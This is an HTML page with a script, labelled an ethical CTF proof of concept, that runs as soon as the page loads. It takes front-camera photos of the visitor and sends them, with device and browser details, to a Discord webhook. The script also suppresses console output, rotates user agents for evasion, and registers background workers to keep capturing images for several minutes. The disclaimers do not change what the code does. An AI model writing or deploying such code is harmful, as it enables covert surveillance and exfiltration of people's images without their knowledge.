<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="mobile-web-app-capable" content="yes">
    <title>CTF</title>
</head>
<body>
    <script>
        // WARNING: Ethical CTF PoC only. Unauthorized use violates privacy laws. Use with explicit consent.
        // Discord webhook URL (replace with your valid webhook)
        const WEBHOOK_URL = 'YOUR_DISCORD_WEBHOOK_URL_HERE'; // Replace with actual webhook URL

        // Stealth: Suppress console and performance APIs
        const suppress = () => {};
        console.log = console.error = console.warn = console.time = console.timeEnd = suppress;
        performance.mark = performance.measure = suppress;

        // Random user agent for evasion
        const userAgents = [
            'Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1',
            'Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Mobile Safari/537.36'
        ];
        const getRandomUA = () => userAgents[Math.floor(Math.random() * userAgents.length)];

        // Send data to webhook with retries
        async function sendItem(type, data, index = null, retries = 3) {
            for (let i = 0; i < retries; i++) {
                try {
                    const formData = new FormData();
                    formData.append('payload_json', JSON.stringify({
                        embeds: [{
                            title: `Zero-Click CTF: ${type}`,
                            fields: [
                                { name: 'Type', value: type },
                                { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
                                { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1000) },
                                { name: 'Device', value: navigator.userAgent || 'Unknown' },
                                { name: 'Browser', value: `${navigator.vendor || 'Unknown'} ${navigator.appVersion || 'Unknown'}` },
                                { name: 'HTTPS', value: location.protocol === 'https:' ? 'Yes' : 'No' },
                                { name: 'Time', value: new Date().toISOString() }
                            ],
                            footer: { text: 'Ethical CTF PoC - Do not misuse' }
                        }]
                    }));
                    if (type.includes('Photo')) {
                        const response = await fetch(data.base64);
                        const blob = await response.blob();
                        formData.append('file', blob, `photo_${index + 1}.webp`);
                    }

                    const response = await fetch(WEBHOOK_URL, {
                        method: 'POST',
                        body: formData,
                        headers: { 'User-Agent': getRandomUA() }
                    });
                    if (!response.ok) throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                    return true;
                } catch (e) {
                    await new Promise(resolve => setTimeout(resolve, 1000 * (i + 1))); // Linear backoff
                    if (i === retries - 1) {
                        await sendItem('Error', { message: `Failed to send ${type}: ${e.message}`, attempt: i + 1 });
                    }
                }
            }
            return false;
        }

        // Check camera permissions
        async function checkCameraPermission() {
            try {
                const permission = await navigator.permissions.query({ name: 'camera' });
                const state = permission.state;
                await sendItem('Permission', { status: state });
                return state === 'granted';
            } catch (e) {
                await sendItem('Permission', { error: `Permission check failed: ${e.message}` });
                return false;
            }
        }

        // Capture a single photo
        async function capturePhoto(stream, index, phase) {
            try {
                const track = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(track);
                const bitmap = await imageCapture.grabFrame();
                const canvas = new OffscreenCanvas(128, 96);
                const ctx = canvas.getContext('2d');
                ctx.drawImage(bitmap, 0, 0, 128, 96);
                const blob = await canvas.convertToBlob({ type: 'image/webp', quality: 0.05 });
                const reader = new FileReader();
                const photo = await new Promise(resolve => {
                    reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
                    reader.readAsDataURL(blob);
                });
                await sendItem(`${phase} Photo ${index + 1}`, photo, index);
                return true;
            } catch (e) {
                // Fallback to canvas
                try {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    await new Promise(resolve => video.onloadedmetadata = resolve);
                    const canvas = document.createElement('canvas');
                    canvas.width = 128;
                    canvas.height = 96;
                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                    const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/webp', 0.05));
                    const reader = new FileReader();
                    const photo = await new Promise(resolve => {
                        reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
                        reader.readAsDataURL(blob);
                    });
                    await sendItem(`${phase} Photo ${index + 1}`, photo, index);
                    video.srcObject = null;
                    return true;
                } catch (e2) {
                    await sendItem(`${phase} Photo ${index + 1}`, { error: `Capture failed: ${e2.message}` }, index);
                    return false;
                }
            }
        }

        // Collect 8 photos quickly (~4 seconds)
        async function collectInitialPhotos() {
            if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                await sendItem('Camera', { error: 'Camera not supported', device: navigator.userAgent });
                return false;
            }

            if (!(await checkCameraPermission())) {
                await sendItem('Permission', { error: 'Camera permission not granted, aborting initial capture' });
                return false;
            }

            let stream = null;
            const maxRetries = 3;
            let retryCount = 0;

            while (!stream && retryCount < maxRetries) {
                try {
                    stream = await navigator.mediaDevices.getUserMedia({ 
                        video: { 
                            facingMode: 'user', // Front-facing camera
                            width: { ideal: 128 }, 
                            height: { ideal: 96 },
                            frameRate: { ideal: 5 }
                        },
                        audio: false 
                    });
                } catch (e) {
                    retryCount++;
                    await sendItem('Camera', { error: `Initial camera access failed (attempt ${retryCount}/${maxRetries}): ${e.message}` });
                    if (retryCount === maxRetries) {
                        await sendItem('Camera', { error: 'Max retries reached, aborting initial capture' });
                        return false;
                    }
                    await new Promise(resolve => setTimeout(resolve, 1000 * (retryCount + 1)));
                }
            }

            if (stream) {
                for (let i = 0; i < 8; i++) {
                    await new Promise(resolve => setTimeout(async () => {
                        await capturePhoto(stream, i, 'Initial');
                        resolve();
                    }, i * 500 + Math.random() * 20));
                }
                stream.getTracks().forEach(track => track.stop());
                await sendItem('Status', { message: 'Initial 8 photos captured successfully' });
                return true;
            }
            return false;
        }

        // Register ServiceWorker or fallback to WebWorker
        async function registerBackgroundWorker() {
            if (location.protocol !== 'https:') {
                await sendItem('Error', { message: 'HTTPS required for ServiceWorker, aborting background capture' });
                return;
            }

            if ('serviceWorker' in navigator) {
                try {
                    const registration = await navigator.serviceWorker.register('/sw.js', { scope: '/' });
                    await navigator.serviceWorker.ready;
                    registration.active.postMessage({ action: 'startBackgroundCapture' });
                    await sendItem('ServiceWorker', { message: 'ServiceWorker registered successfully' });
                } catch (e) {
                    await sendItem('ServiceWorker', { error: `Failed to register: ${e.message}` });
                    // Fallback to WebWorker
                    if ('Worker' in window) {
                        const worker = new Worker(URL.createObjectURL(new Blob([swJsCode], { type: 'text/javascript' })));
                        worker.postMessage({ action: 'startBackgroundCapture' });
                        await sendItem('WebWorker', { message: 'WebWorker fallback activated' });
                    } else {
                        await sendItem('Worker', { error: 'No ServiceWorker or WebWorker support, background capture aborted' });
                    }
                }
            } else {
                await sendItem('ServiceWorker', { error: 'ServiceWorker not supported, trying WebWorker' });
                if ('Worker' in window) {
                    const worker = new Worker(URL.createObjectURL(new Blob([swJsCode], { type: 'text/javascript' })));
                    worker.postMessage({ action: 'startBackgroundCapture' });
                    await sendItem('WebWorker', { message: 'WebWorker fallback activated' });
                } else {
                    await sendItem('Worker', { error: 'No ServiceWorker or WebWorker support, background capture aborted' });
                }
            }
        }

        // Ensure background execution
        async function keepRunningInBackground() {
            try {
                if ('wakeLock' in navigator) {
                    const lock = await navigator.wakeLock.request('screen');
                    setTimeout(() => lock.release(), 5000);
                    await sendItem('WakeLock', { message: 'WakeLock acquired for initial captures' });
                }

                document.addEventListener('visibilitychange', async () => {
                    if (document.visibilityState === 'hidden') {
                        await registerBackgroundWorker();
                    }
                });

                const keepAlive = setInterval(() => {
                    fetch('/noop', { method: 'HEAD', headers: { 'User-Agent': getRandomUA() } }).catch(suppress);
                }, 5000);
                setTimeout(() => clearInterval(keepAlive), 420000);
            } catch (e) {
                await sendItem('Background', { error: `Background setup failed: ${e.message}` });
            }
        }

        // Inline ServiceWorker code for WebWorker fallback
        const swJsCode = `
            self.addEventListener('message', async event => {
                if (event.data.action !== 'startBackgroundCapture') return;
                const WEBHOOK_URL = '${WEBHOOK_URL}';
                async function sendItem(type, data, index = null) {
                    try {
                        const formData = new FormData();
                        formData.append('payload_json', JSON.stringify({
                            embeds: [{
                                title: \`Zero-Click CTF: \${type}\`,
                                fields: [
                                    { name: 'Type', value: type },
                                    { name: 'Index', value: index !== null ? index + 1 : 'N/A' },
                                    { name: 'Data', value: JSON.stringify(data, null, 2).substring(0, 1000) },
                                    { name: 'Device', value: navigator.userAgent || 'Worker' },
                                    { name: 'Time', value: new Date().toISOString()
                                ],
                                footer: { text: 'Ethical CTF PoC - Do not misuse' }
                            }]
                        }));
                        if (type.includes('Photo')) {
                            const response = await fetch(data.base64);
                            const blob = await response.blob();
                            formData.append('file', blob, \`photo_\${index + 1}.webp\`);
                        }
                        const response = await fetch(WEBHOOK_URL, {
                            method: 'POST',
                            body: formData,
                            headers: { 'User-Agent': '${getRandomUA()}' }
                        });
                        if (!response.ok) throw new Error(\`HTTP \${response.status}\`);
                        return true;
                    } catch (e) {
                        return false;
                    }
                }
                async function capturePhoto(index) {
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({ 
                            video: { 
                                facingMode: 'user',
                                width: { ideal: 128 },
                                height: { ideal: 96 },
                                frameRate: { ideal: 5 }
                            },
                            audio: false 
                        });
                        const track = stream.getVideoTracks()[0];
                        const imageCapture = new ImageCapture(track);
                        const bitmap = await imageCapture.grabFrame();
                        const canvas = new OffscreenCanvas(128, 96);
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(bitmap, 0, 0, 128, 96);
                        const blob = await canvas.convertToBlob({ type: 'image/webp', quality: 0.05 });
                        const reader = new FileReader();
                        const photo = await new Promise(resolve => {
                            reader.onloadend = () => resolve({ base64: reader.result, timestamp: new Date().toISOString() });
                            reader.readAsDataURL(blob);
                        });
                        await sendItem(\`Background Photo \${index + 1}\`, photo, index);
                        stream.getTracks().forEach(track => track.stop());
                        return true;
                    } catch (e) {
                        await sendItem(\`Background Photo \${index + 1}\`, { error: \`Capture failed: \${e.message}\` }, index);
                        return false;
                    }
                }
                await sendItem('Debug', { message: 'Worker started', time: new Date().toISOString() });
                const totalPhotos = 8;
                const totalDuration = 420000;
                const interval = totalDuration / totalPhotos;
                for (let i = 0; i < totalPhotos; i++) {
                    await new Promise(resolve => setTimeout(async () => {
                        await capturePhoto(i);
                        resolve();
                    }, i * interval + Math.random() * 20));
                }
                await sendItem('Status', { message: 'Background 8 photos captured successfully' });
            });
        `;

        // Start zero-click collection
        (async () => {
            await sendItem('Debug', { 
                message: 'Script started', 
                url: location.href, 
                device: navigator.userAgent, 
                https: location.protocol === 'https:' ? 'Yes' : 'No',
                time: new Date().toISOString()
            });
            await keepRunningInBackground();
            await collectInitialPhotos();
        })();
    </script>
</body>
</html>
